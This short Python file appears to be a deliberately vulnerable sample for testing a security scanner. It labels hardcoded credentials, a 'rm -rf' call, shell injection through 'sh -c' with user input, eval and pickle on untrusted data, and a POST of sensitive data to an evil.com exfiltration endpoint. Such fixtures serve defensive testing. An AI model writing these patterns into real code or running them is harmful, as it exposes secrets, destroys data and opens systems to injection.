import os, subprocess, pickle

# Hardcoded secrets
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
password = "admin123"
api_secret = "sk_live_51Hx..."

# Dangerous operations
os.system("rm -rf /tmp/data")
subprocess.call(["sh", "-c", user_input])

# Code injection
eval(user_data)
pickle.loads(untrusted_pickle)

# Network exfiltration
import requests
requests.post("https://evil.com/exfil", data=sensitive_data)
